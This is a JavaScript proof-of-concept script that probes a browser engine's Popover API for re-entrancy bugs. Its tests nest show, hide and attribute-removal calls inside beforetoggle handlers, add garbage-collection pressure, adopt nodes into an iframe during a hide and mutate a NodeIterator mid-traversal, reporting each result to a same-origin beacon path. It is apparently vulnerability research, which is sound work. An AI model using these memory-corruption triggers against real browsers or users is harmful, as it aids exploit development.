// p518 — Popover API re-entrancy via synchronous beforetoggle
//
// HTMLElement::showPopover fires beforetoggle synchronously (HTMLElement.cpp:1368),
// then calls hideAllPopoversUntil which fires more beforetoggle events.
// hideAllPopoversUntil iterates autoPopoverList while calling hidePopoverInternal
// which fires beforetoggle synchronously (HTMLElement.cpp:1447).
//
// Attack vectors:
// T1: Feature detection for popover API
// T2: In beforetoggle handler of hiding popover, showPopover on new element
//     → adds to autoPopoverList during iteration
// T3: Stack manipulation — show A(auto) then B(auto), B's hide handler
//     removes A's popover attribute → stale endpoint in hideAllPopoversUntil
// T4: Rapid show/hide cycle with GC pressure during beforetoggle
// T5: Cross-document popover adoption during beforetoggle
//
// Beacon prefix: V518-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V518-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // T1: Feature detection
  var features = {};
  try {
    var testEl = document.createElement('div');
    testEl.setAttribute('popover', 'auto');
    features.popoverAttr = testEl.popover !== undefined;
    features.showPopover = typeof testEl.showPopover === 'function';
    features.hidePopover = typeof testEl.hidePopover === 'function';
    features.togglePopover = typeof testEl.togglePopover === 'function';
    features.ToggleEvent = typeof ToggleEvent !== 'undefined';
    features.WeakRef = typeof WeakRef !== 'undefined';
  } catch(e) {
    features.error = e.message;
  }
  B('T1-FEATURES', JSON.stringify(features));

  if (!features.showPopover) {
    B('T1-DEAD', 'Popover API not available');
    return;
  }

  var testArea = document.createElement('div');
  testArea.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;overflow:hidden';
  document.body.appendChild(testArea);

  // T2: Show new popover during hide's beforetoggle
  setTimeout(function() {
    try {
      B('T2-START', 'show during hide beforetoggle');
      var t2log = [];

      var popA = document.createElement('div');
      popA.setAttribute('popover', 'auto');
      popA.textContent = 'A';
      testArea.appendChild(popA);

      var popB = document.createElement('div');
      popB.setAttribute('popover', 'auto');
      popB.textContent = 'B';
      testArea.appendChild(popB);

      var popC = document.createElement('div');
      popC.setAttribute('popover', 'auto');
      popC.textContent = 'C';
      testArea.appendChild(popC);

      // Show A, then B (B's show hides A via hideAllPopoversUntil)
      popA.showPopover();
      t2log.push('A-shown');

      // When A is being hidden (beforetoggle), show C
      popA.addEventListener('beforetoggle', function(e) {
        if (e.newState === 'closed') {
          t2log.push('A-hiding');
          try {
            popC.showPopover();
            t2log.push('C-shown-during-A-hide');
          } catch(err) {
            t2log.push('C-show-err:' + err.message);
          }
        }
      });

      popB.showPopover();
      t2log.push('B-shown');

      // Check state
      t2log.push('A:' + (popA.matches(':popover-open') ? 'open' : 'closed'));
      t2log.push('B:' + (popB.matches(':popover-open') ? 'open' : 'closed'));
      t2log.push('C:' + (popC.matches(':popover-open') ? 'open' : 'closed'));

      B('T2-DONE', JSON.stringify(t2log));

      // Cleanup
      try { popA.hidePopover(); } catch(e) {}
      try { popB.hidePopover(); } catch(e) {}
      try { popC.hidePopover(); } catch(e) {}
    } catch(e) {
      B('T2-ERR', e.name + ': ' + e.message);
    }
  }, 100);

  // T3: Remove popover attribute during beforetoggle (stale endpoint)
  setTimeout(function() {
    try {
      B('T3-START', 'remove popover attr during beforetoggle');
      var t3log = [];

      var els = [];
      for (var i = 0; i < 5; i++) {
        var el = document.createElement('div');
        el.setAttribute('popover', 'auto');
        el.textContent = 'P' + i;
        el.id = 'p3-' + i;
        testArea.appendChild(el);
        els.push(el);
      }

      // Show them in order: P0, P1, P2, P3, P4
      // Each show hides previous ones via hideAllPopoversUntil
      // But we interfere with the hide chain
      for (var i = 0; i < 5; i++) {
        try { els[i].showPopover(); t3log.push('show-' + i); }
        catch(e) { t3log.push('show-err-' + i + ':' + e.message); }
      }

      // Now P4 is showing (topmost). Set up handler:
      // When P4 is hiding, remove popover attribute from P3
      els[4].addEventListener('beforetoggle', function(e) {
        if (e.newState === 'closed') {
          t3log.push('P4-hiding');
          // Remove popover from P3 — makes it invalid as endpoint
          els[3].removeAttribute('popover');
          t3log.push('P3-attr-removed');

          // Also try to show a new one
          var fresh = document.createElement('div');
          fresh.setAttribute('popover', 'auto');
          fresh.textContent = 'FRESH';
          testArea.appendChild(fresh);
          try {
            fresh.showPopover();
            t3log.push('fresh-shown');
          } catch(err) {
            t3log.push('fresh-err:' + err.message);
          }
        }
      });

      // Now show a new popover that triggers hideAllPopoversUntil
      var trigger = document.createElement('div');
      trigger.setAttribute('popover', 'auto');
      trigger.textContent = 'TRIGGER';
      testArea.appendChild(trigger);

      try {
        trigger.showPopover();
        t3log.push('trigger-shown');
      } catch(e) {
        t3log.push('trigger-err:' + e.message);
      }

      B('T3-DONE', JSON.stringify(t3log.slice(0, 30)));
    } catch(e) {
      B('T3-ERR', e.name + ': ' + e.message);
    }
  }, 800);

  // T4: Rapid toggle cycle with GC pressure
  setTimeout(function() {
    try {
      B('T4-START', 'rapid toggle + GC');
      var t4log = [];
      var count = 0;

      var popover = document.createElement('div');
      popover.setAttribute('popover', 'auto');
      popover.textContent = 'TOGGLE';
      testArea.appendChild(popover);

      popover.addEventListener('beforetoggle', function(e) {
        count++;
        if (count > 50) return;

        // GC pressure during handler
        var garbage = [];
        for (var g = 0; g < 500; g++) garbage.push(new ArrayBuffer(256));
        garbage = null;

        if (e.newState === 'open' && count < 20) {
          // In the show handler, try to immediately hide
          try {
            // Can't hide during show (ScopedStartShowingOrHiding guard)
            // But we can manipulate other elements
            var ephemeral = document.createElement('div');
            ephemeral.setAttribute('popover', 'auto');
            testArea.appendChild(ephemeral);
            ephemeral.showPopover();
            ephemeral.remove();
            t4log.push('ephemeral-' + count);
          } catch(err) {
            t4log.push('err-' + count + ':' + err.message);
          }
        }
      });

      // Rapid show/hide cycles
      for (var cycle = 0; cycle < 10; cycle++) {
        try {
          popover.showPopover();
          popover.hidePopover();
        } catch(e) {
          t4log.push('cycle-err-' + cycle);
        }
      }

      t4log.push('cycles-done:' + count);
      B('T4-DONE', JSON.stringify(t4log.slice(0, 30)));
    } catch(e) {
      B('T4-ERR', e.name + ': ' + e.message);
    }
  }, 1500);

  // T5: adoptNode during beforetoggle — move popover to different document
  setTimeout(function() {
    try {
      B('T5-START', 'adoptNode during beforetoggle');
      var t5log = [];

      var iframe = document.createElement('iframe');
      iframe.srcdoc = '<html><body></body></html>';
      testArea.appendChild(iframe);

      setTimeout(function() {
        try {
          var iframeDoc = iframe.contentDocument;
          if (!iframeDoc) {
            B('T5-DEAD', 'no iframe document access');
            return;
          }

          var popover = document.createElement('div');
          popover.setAttribute('popover', 'auto');
          popover.textContent = 'ADOPT-ME';
          testArea.appendChild(popover);

          popover.addEventListener('beforetoggle', function(e) {
            if (e.newState === 'closed') {
              t5log.push('hiding');
              try {
                // Adopt popover into iframe document during hide
                iframeDoc.body.appendChild(iframeDoc.adoptNode(popover));
                t5log.push('adopted');
              } catch(err) {
                t5log.push('adopt-err:' + err.message);
              }
            }
          });

          popover.showPopover();
          t5log.push('shown');

          // Trigger hide by showing another auto popover
          var other = document.createElement('div');
          other.setAttribute('popover', 'auto');
          testArea.appendChild(other);
          other.showPopover();
          t5log.push('other-shown');

          // Check state after adoption
          t5log.push('parent:' + (popover.parentNode ? popover.parentNode.nodeName : 'null'));
          t5log.push('doc:' + (popover.ownerDocument === document ? 'main' : 'iframe'));

          B('T5-DONE', JSON.stringify(t5log));
        } catch(e) {
          B('T5-ERR', e.name + ': ' + e.message);
        }
      }, 200);
    } catch(e) {
      B('T5-ERR', '' + e);
    }
  }, 2300);

  // T6: NodeIterator filter removes nodes during traversal
  setTimeout(function() {
    try {
      B('T6-START', 'NodeIterator filter mutation');
      var t6log = [];

      var container = document.createElement('div');
      for (var i = 0; i < 20; i++) {
        var child = document.createElement('span');
        child.textContent = 'N' + i;
        child.className = 'iter-target';
        container.appendChild(child);
      }
      testArea.appendChild(container);

      var callCount = 0;
      var iter = document.createNodeIterator(
        container,
        NodeFilter.SHOW_ELEMENT,
        {
          acceptNode: function(node) {
            callCount++;
            if (callCount === 5) {
              // Remove several nodes during filter
              var spans = container.querySelectorAll('.iter-target');
              for (var j = 10; j < 15; j++) {
                if (spans[j] && spans[j].parentNode) {
                  spans[j].parentNode.removeChild(spans[j]);
                }
              }
              t6log.push('removed-5-nodes-at-call-' + callCount);

              // GC pressure
              var gc = [];
              for (var g = 0; g < 2000; g++) gc.push(new ArrayBuffer(128));
              gc = null;
            }
            return NodeFilter.FILTER_ACCEPT;
          }
        }
      );

      var visited = [];
      var node;
      while (node = iter.nextNode()) {
        visited.push(node.textContent);
      }

      t6log.push('visited:' + visited.length);
      t6log.push('calls:' + callCount);
      B('T6-DONE', JSON.stringify(t6log));
    } catch(e) {
      B('T6-ERR', e.name + ': ' + e.message);
    }
  }, 3200);

  // Final summary
  setTimeout(function() {
    B('COMPLETE', 'all tests done');
  }, 5000);
})();
